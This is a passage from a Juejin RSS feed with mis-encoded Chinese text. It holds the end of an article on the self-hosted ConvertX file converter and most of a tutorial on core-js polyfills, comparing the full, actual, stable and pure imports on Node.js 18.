æŒ‡å®š</td></tr><tr><td>UNAUTHENTICATED_USER_SHARING</td><td>false</td><td>æ˜¯å¦åœ¨æ‰€æœ‰æœªè®¤è¯ç”¨æˆ·ä¹‹é—´å…±äº«è½¬æ¢å†å²è®°å½•</td></tr><tr><td>MAX_CONVERT_PROCESS</td><td>0</td><td>å…è®¸çš„æœ€å¤§å¹¶å‘è½¬æ¢è¿›ç¨‹æ•°ã€‚è®¾ç½®ä¸º 0 è¡¨ç¤ºæ— é™åˆ¶ã€‚</td></tr></tbody></table>
<h2 data-id="heading-5">ğŸŒ…æ€»ç»“</h2>
<p><strong>ConvertX å®Œç¾åœ°è§£å†³äº†ä¸€ä¸ªæ ¸å¿ƒç—›ç‚¹ï¼šåœ¨ä¿éšœæ•°æ®éšç§çš„å‰æä¸‹ï¼Œæä¾›å ªæ¯”ç”šè‡³è¶…è¶Šå•†ä¸šäº‘æœåŠ¡çš„æ–‡ä»¶æ ¼å¼è½¬æ¢èƒ½åŠ›ã€‚</strong> æ— è®ºä½ æ˜¯ä¸ªäººç”¨æˆ·ï¼Œæƒ³è¦ä¸€ä¸ªå¹²å‡€ã€æ— å¹¿å‘Šã€ä¸é™æ¬¡æ•°çš„æœ¬åœ°è½¬æ¢å·¥å…·ï¼›è¿˜æ˜¯å›¢é˜Ÿæˆ–ç»„ç»‡ï¼Œéœ€è¦åœ¨å†…ç½‘éƒ¨ç½²ä¸€ä¸ªå®‰å…¨çš„æ–‡ä»¶å¤„ç†æœåŠ¡ï¼ŒConvertX éƒ½æ˜¯ä¸€ä¸ªæå…·å¸å¼•åŠ›çš„é€‰æ‹©ã€‚</p>
<p>å…¶åŸºäº Docker çš„ä¸€é”®å¼éƒ¨ç½²ã€è¯¦å°½çš„é…ç½®é€‰é¡¹å’Œæ´»è·ƒçš„å¼€æºç”Ÿæ€ï¼Œä½¿å¾—ä»è¯•ç”¨ã€éƒ¨ç½²åˆ°é•¿æœŸç»´æŠ¤éƒ½å˜å¾—éå¸¸è½»æ¾ã€‚å¦‚æœä½ åŒå€¦äº†åœ¨å¤šä¸ªåœ¨çº¿è½¬æ¢ç½‘ç«™é—´è·³è½¬ï¼Œæˆ–æ˜¯å¯¹äº‘æœåŠ¡çš„æ•°æ®å®‰å…¨å¿ƒå­˜é¡¾è™‘ï¼Œä¸å¦¨ç°åœ¨å°±å°è¯•éƒ¨ç½²ä¸€ä¸ªå±äºä½ è‡ªå·±çš„ ConvertXã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d73106e49464640808061ad601a1975~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527667&amp;x-signature=EcJVtGJWS5pP1yYFOojreSlynl0%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Polyfillæ–¹å¼è§£å†³å‰ç«¯å…¼å®¹æ€§é—®é¢˜ï¼šcore-jsåŒ…ç»“æ„ä¸å„ç§é…ç½®ç­–ç•¥]]></title>    <link>https://juejin.cn/post/7597258378590846986</link>    <guid>https://juejin.cn/post/7597258378590846986</guid>    <pubDate>2026-01-20T15:57:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597258378590846986" data-draft-id="7597317683051429897" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Polyfillæ–¹å¼è§£å†³å‰ç«¯å…¼å®¹æ€§é—®é¢˜ï¼šcore-jsåŒ…ç»“æ„ä¸å„ç§é…ç½®ç­–ç•¥"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,Node.js"/> <meta itemprop="datePublished" content="2026-01-20T15:57:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ¼‚æµç“¶jz"/> <meta itemprop="url" content="https://juejin.cn/user/3694779980078877"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Polyfillæ–¹å¼è§£å†³å‰ç«¯å…¼å®¹æ€§é—®é¢˜ï¼šcore-jsåŒ…ç»“æ„ä¸å„ç§é…ç½®ç­–ç•¥
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3694779980078877/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ¼‚æµç“¶jz
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T15:57:09.000Z" title="Tue Jan 20 2026 15:57:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»20åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç®€ä»‹</h2>
<p>åœ¨ä¹‹å‰æˆ‘ä»‹ç»è¿‡Babelï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fjzplp.github.io%2F2025%2Fbabel-intro.html" target="_blank" title="https://jzplp.github.io/2025/babel-intro.html" ref="nofollow noopener noreferrer">è§£é”Babelæ ¸å¿ƒåŠŸèƒ½ï¼šä»è½¬ä¹‰è¯­æ³•åˆ°æ’ä»¶å¼€å‘</a>ï¼ŒBabelæ˜¯ä¸€ä¸ªä½¿ç”¨ASTè½¬ä¹‰JavaScriptè¯­æ³•ï¼Œæé«˜ä»£ç åœ¨æµè§ˆå™¨å…¼å®¹æ€§çš„å·¥å…·ã€‚ä½†æœ‰äº›ECMAScriptå¹¶ä¸æ˜¯æ–°çš„è¯­æ³•ï¼Œè€Œæ˜¯ä¸€äº›æ–°å¯¹è±¡ï¼Œæ–°æ–¹æ³•ç­‰ç­‰ï¼Œè¿™äº›å¹¶ä¸èƒ½ä½¿ç”¨ASTæŠ½è±¡è¯­æ³•æ ‘æ¥è½¬ä¹‰ã€‚å› æ­¤Babelåˆ©ç”¨core-jså®ç°è¿™äº›ä»£ç çš„å…¼å®¹æ€§ã€‚</p>
<p>core-jsæ˜¯ä¸€ä¸ªçŸ¥åçš„å‰ç«¯å·¥å…·åº“ï¼Œé‡Œé¢åŒ…å«äº†ECMAScriptæ ‡å‡†ä¸­æä¾›çš„æ–°å¯¹è±¡/æ–°æ–¹æ³•ç­‰ï¼Œè€Œä¸”æ˜¯ä½¿ç”¨æ—§ç‰ˆæœ¬æ”¯æŒçš„è¯­æ³•æ¥å®ç°è¿™äº›æ–°çš„APIã€‚è¿™æ ·å³ä½¿æµè§ˆå™¨æ²¡æœ‰å®ç°æ ‡å‡†ä¸­çš„æ–°APIï¼Œä¹Ÿèƒ½é€šè¿‡æ³¨å…¥core-jsä»£ç æ¥æä¾›å¯¹åº”çš„åŠŸèƒ½ã€‚</p>
<p>åƒè¿™ç§é€šè¿‡æ³¨å…¥ä»£ç å®ç°æµè§ˆå™¨æ²¡æœ‰æä¾›çš„APIç‰¹æ€§ï¼Œå«åšPolyfillã€‚è¿™ä¸ªå•è¯çš„æœ¬æ„æ˜¯å¡«å……ææ–™ï¼Œåœ¨JavaScripté¢†åŸŸä¸­ï¼Œè¿™äº›æ³¨å…¥çš„ä»£ç å°±ç±»ä¼¼â€œå¡«å……ææ–™â€ä¸€æ ·ï¼Œå¸®åŠ©æˆ‘ä»¬æé«˜ä»£ç çš„å…¼å®¹æ€§ã€‚å¦å¤–core-jsè¿˜æä¾›äº†ä¸€äº›è¿˜åœ¨æè®®ä¸­çš„APIçš„å®ç°ã€‚</p>
<h2 data-id="heading-1">core-jsä½¿ç”¨æ–¹å¼</h2>
<h3 data-id="heading-2">ä½¿ç”¨å‰åå¯¹æ¯”</h3>
<p>è¦æƒ³çœ‹åˆ°core-jsä½¿ç”¨å‰åçš„æ•ˆæœå¯¹æ¯”ï¼Œé¦–å…ˆéœ€è¦ç¡®å®šæŸä¸ªç‰¹æ€§å’Œå¯¹åº”çš„æ‰§è¡Œç¯å¢ƒï¼Œåœ¨è¿™ä¸ªç¯å¢ƒä¸­å¯¹åº”çš„ç‰¹æ€§ä¸å­˜åœ¨ã€‚æˆ‘æœ¬åœ°æ˜¯Node.js v18.19.1ç‰ˆæœ¬ï¼Œè¿™ä¸ªç‰ˆæœ¬å¹¶æ²¡æœ‰å®ç°Promise.tryè¿™ä¸ªæ–¹æ³•ï¼Œå› æ­¤æˆ‘ä»¬å°±ç”¨è¿™ä¸ªæ–¹æ³•è¿›è¡Œå®éªŒã€‚é¦–å…ˆæ˜¯æ²¡æœ‰å¼•å…¥core-jsçš„åœºæ™¯ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})

<span class="hljs-comment">/* æ‰§è¡Œç»“æœ
Promise.try(() =&gt; {
           ^
TypeError: Promise.try is not a function
*/</span>
</code></pre>
<p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰å¼•å…¥core-jsï¼Œç›´æ¥ä½¿ç”¨Promise.tryæ—¶ï¼Œä¼šå› ä¸ºæ²¡æœ‰è¯¥æ–¹æ³•è€ŒæŠ¥é”™ã€‚ç„¶åå†è¯•è¯•å¼•å…¥core-jsçš„æ•ˆæœï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js'</span>)
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
jzplp!
*/</span>
</code></pre>
<p>å¯ä»¥çœ‹åˆ°å¼•å…¥core-jsåï¼ŒåŸæœ¬ä¸å­˜åœ¨çš„APIè¢«å¡«å……äº†ï¼Œæˆ‘ä»¬çš„ä»£ç å¯ä»¥æ­£å¸¸æ‰§è¡Œå¹¶æ‹¿åˆ°ç»“æœäº†ã€‚è¿™å°±æ˜¯core-jsæé«˜å…¼å®¹æ€§çš„æ•ˆæœã€‚</p>
<h3 data-id="heading-3">å•ä¸ªAPIå¼•å…¥</h3>
<p>core-jsä¸ä»…å¯ä»¥ç›´æ¥å¼•å…¥å…¨éƒ¨è¯­æ³•ï¼Œè¿˜å¯ä»¥ä»…å¼•å…¥å•ä¸ªAPIï¼Œæ¯”å¦‚æŸä¸ªå¯¹è±¡æˆ–æŸä¸ªæ–¹æ³•ã€‚é¦–å…ˆçœ‹ä¸‹åªå¼•å…¥Promiseå¯¹è±¡ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// require('core-js/full') ç­‰äº require('core-js')</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/full/promise'</span>)
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
jzplp!
*/</span>
</code></pre>
<p>ç„¶åå†çœ‹ä¸‹ç›´æ¥å¼•å…¥å¯¹è±¡ä¸­çš„æŸä¸ªæ–¹æ³•ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/full/promise/try'</span>)
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
jzplp!
*/</span>
</code></pre>
<h3 data-id="heading-4">ä¸æ³¨å…¥å…¨å±€å¯¹è±¡</h3>
<p>å‰é¢å±•ç¤ºçš„åœºæ™¯ï¼Œcore-jséƒ½æ˜¯å°†APIç›´æ¥æ³¨å…¥åˆ°å…¨å±€ï¼Œè¿™æ ·ä½¿ç”¨è¿™äº›APIå°±å¦‚ç¯å¢ƒæœ¬èº«æ”¯æŒä¸€æ ·ï¼ŒåŸºæœ¬æ„Ÿå—ä¸åˆ°åŒºåˆ«ã€‚ä½†å¦‚æœæˆ‘ä»¬ä¸å¸Œæœ›ç›´æ¥æ³¨å…¥åˆ°å…¨å±€æ—¶ï¼Œcore-jsä¹Ÿæä¾›äº†ä½¿ç”¨æ–¹å¼ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> promise = <span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js-pure/full/promise'</span>);
promise.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!2'</span>)
})
<span class="hljs-comment">/* è¾“å‡ºç»“æœ
jzplp!
Promise.try(() =&gt; {
           ^
TypeError: Promise.try is not a function
*/</span>
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œä½¿ç”¨core-js-pureè¿™ä¸ªåŒ…ä¹‹åï¼Œå¯ä»¥ç›´æ¥å¯¼å‡ºæˆ‘ä»¬å¸Œæœ›è¦çš„APIï¼Œè€Œä¸ç›´æ¥æ³¨å…¥åˆ°å…¨å±€ã€‚æ­¤æ—¶ç›´æ¥ä½¿ç”¨å…¨å±€å¯¹è±¡æ–¹æ³•ä¾ç„¶æŠ¥é”™ã€‚è€Œcore-jsè¿™ä¸ªåŒ…è™½ç„¶ä¹Ÿèƒ½å¯¼å‡ºï¼Œä½†å®ƒè¿˜æ˜¯ä¼šç›´æ¥æ³¨å…¥å…¨å±€ï¼Œæˆ‘ä»¬çœ‹ä¸‹ä¾‹å­ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> promise = <span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/full/promise'</span>);
promise.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!2'</span>)
})

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
jzplp!
jzplp!2
*/</span>
</code></pre>
<p>å› æ­¤ï¼Œå¦‚æœå¸Œæœ›ä»…ä½¿ç”¨å¯¼å‡ºå¯¹è±¡ï¼Œè¿˜æ˜¯éœ€è¦ä½¿ç”¨core-js-pureè¿™ä¸ªåŒ…ã€‚core-js-pureä¹Ÿå¯ä»¥ä»…å¯¼å‡ºå¯¹è±¡æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> try2 = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-pure/full/promise/try"</span>);
<span class="hljs-title class_">Promise</span>.<span class="hljs-property">try</span> = try2;
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"jzplp!"</span>);
});

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
jzplp!
*/</span>
</code></pre>
<p>å› ä¸ºå¯¼å‡ºçš„å¯¹è±¡æ–¹æ³•ä¸èƒ½ç‹¬ç«‹ä½¿ç”¨ï¼Œå› æ­¤åœ¨ä¾‹å­ä¸­æˆ‘ä»¬è¿˜æ˜¯å°†å…¶æ³¨å…¥åˆ°Promiseå¯¹è±¡åä½¿ç”¨ã€‚</p>
<h3 data-id="heading-5">ç‰¹æ€§åˆ†ç±»å¼•å…¥</h3>
<p>core-jsä¸­åŒ…å«éå¸¸å¤šAPIç‰¹æ€§çš„å…¼å®¹ä»£ç ï¼Œæœ‰äº›æ˜¯å·²ç»ç¨³å®šçš„ç‰¹æ€§ï¼Œæœ‰äº›æ˜¯è¿˜å¤„åœ¨æè®®é˜¶æ®µçš„ï¼Œä¸ç¨³å®šçš„ç‰¹æ€§ã€‚æˆ‘ä»¬ç›´æ¥å¼•å…¥core-jsä¼šæŠŠè¿™äº›ç‰¹æ€§å…¨éƒ¨å¼•å…¥ï¼Œä½†å¦‚æœä¸éœ€è¦é‚£äº›ä¸ç¨³å®šç‰¹æ€§ï¼Œcore-jsä¹Ÿæä¾›äº†å¤šç§å¼•å…¥æ–¹å¼ï¼š</p>
<ul>
<li>core-js å¼•å…¥æ‰€æœ‰ç‰¹æ€§ï¼ŒåŒ…æ‹¬æ—©æœŸçš„æè®®</li>
<li>core-js/full ç­‰äºå¼•å…¥core-js</li>
<li>core-js/actual åŒ…å«ç¨³å®šçš„ESå’ŒWebæ ‡å‡†ç‰¹æ€§ï¼Œä»¥åŠstage3çš„ç‰¹æ€§</li>
<li>core-js/stable åŒ…å«ç¨³å®šçš„ESå’ŒWebæ ‡å‡†ç‰¹æ€§</li>
<li>core-js/es åŒ…å«ç¨³å®šçš„ESç‰¹æ€§</li>
</ul>
<p>è¿™é‡Œæˆ‘ä»¬ä¸¾ä¸¤ä¸ªä¾‹å­å°è¯•ä¸‹ã€‚é¦–å…ˆç”±äºECMAScriptæ ‡å‡†ä¸€ç›´åœ¨æ›´æ–°ä¸­ï¼Œæœ‰äº›ç‰¹æ€§ç°åœ¨æ˜¯æè®®ï¼Œæœªæ¥å¯èƒ½å°±å·²ç»è¢«åˆ—å…¥æ­£å¼ç‰¹æ€§äº†ã€‚å› æ­¤è¿™é‡Œçš„ä¾‹å­éœ€è¦æ˜ç¡®ç¯å¢ƒå’Œcore-jsç‰ˆæœ¬ã€‚è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨Node.js v18.19.1å’Œcore-js@3.47.0ç‰ˆæœ¬ï¼Œä»¥å†™è¿™ç¯‡æ–‡ç« çš„æ—¶é—´ä¸ºå‡†ã€‚</p>
<p>é¦–å…ˆç¬¬ä¸€ä¸ªç‰¹æ€§æ˜¯ï¼šæ•°ç»„çš„lastIndexå±æ€§ï¼Œè¿™æ˜¯ä¸€ä¸ªstage1é˜¶æ®µçš„APIï¼Œè¿™é‡Œé’ˆå¯¹ä¸åŒçš„å¼•å…¥æ–¹å¼è¿›è¡Œå°è¯•ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ä¸å¼•å…¥core-jså°è¯•</span>
<span class="hljs-keyword">const</span> arr = [<span class="hljs-string">"jz"</span>, <span class="hljs-string">"plp"</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">lastIndex</span>);
<span class="hljs-comment">/* è¾“å‡ºç»“æœ
undefined
*/</span>

<span class="hljs-comment">// å¼•å…¥core-js/full</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/full"</span>);
<span class="hljs-keyword">const</span> arr = [<span class="hljs-string">"jz"</span>, <span class="hljs-string">"plp"</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">lastIndex</span>);
<span class="hljs-comment">/* è¾“å‡ºç»“æœ
1
*/</span>

<span class="hljs-comment">// å¼•å…¥core-js/actual</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/actual"</span>);
<span class="hljs-keyword">const</span> arr = [<span class="hljs-string">"jz"</span>, <span class="hljs-string">"plp"</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">lastIndex</span>);

<span class="hljs-comment">/* è¾“å‡ºç»“æœ
undefined
*/</span>
</code></pre>
<p>é¦–å…ˆå½“ä¸å¼•å…¥core-jsæ—¶ï¼Œå› ä¸ºä¸æ”¯æŒè¿™ä¸ªAPIï¼Œæ‰€ä»¥è¾“å‡ºundefinedã€‚core-js/fullæ”¯æŒstage1é˜¶æ®µçš„APIï¼Œå¯ä»¥æ­£ç¡®è¾“å‡ºç»“æœã€‚ä½†core-js/actualä»…æ”¯æŒstage3é˜¶æ®µçš„APIï¼Œå› æ­¤è¿˜æ˜¯ä¸æ”¯æŒè¿™ä¸ªAPIã€‚</p>
<p>ç„¶åæˆ‘ä»¬å†çœ‹ä¸‹å¦å¤–ä¸€ä¸ªAPIï¼Œæ•°ç»„çš„groupByæ–¹æ³•ã€‚è¿™æ˜¯ä¸€ä¸ªstage3é˜¶æ®µçš„APIï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ä¸å¼•å…¥core-jså°è¯•</span>
<span class="hljs-keyword">const</span> arr = [
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz2"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"plp"</span> },
];
<span class="hljs-keyword">const</span> arrNew = arr.<span class="hljs-title function_">groupBy</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">group</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arrNew)
<span class="hljs-comment">/* è¾“å‡ºç»“æœ
const arrNew = arr.groupBy(item =&gt; item.group);
                   ^
TypeError: arr.groupBy is not a function
*/</span>

<span class="hljs-comment">// å¼•å…¥core-js/actual</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/actual"</span>);
<span class="hljs-keyword">const</span> arr = [
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz2"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"plp"</span> },
];
<span class="hljs-keyword">const</span> arrNew = arr.<span class="hljs-title function_">groupBy</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">group</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arrNew)
<span class="hljs-comment">/* è¾“å‡ºç»“æœ
[Object: null prototype] {
  '1': [ { group: 1, value: 'jz' }, { group: 1, value: 'plp' } ],
  '2': [ { group: 2, value: 'jz2' } ]
}
*/</span>

<span class="hljs-comment">// å¼•å…¥core-js/stable</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/stable"</span>);
<span class="hljs-keyword">const</span> arr = [
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz2"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"plp"</span> },
];
<span class="hljs-keyword">const</span> arrNew = arr.<span class="hljs-title function_">groupBy</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">group</span>);
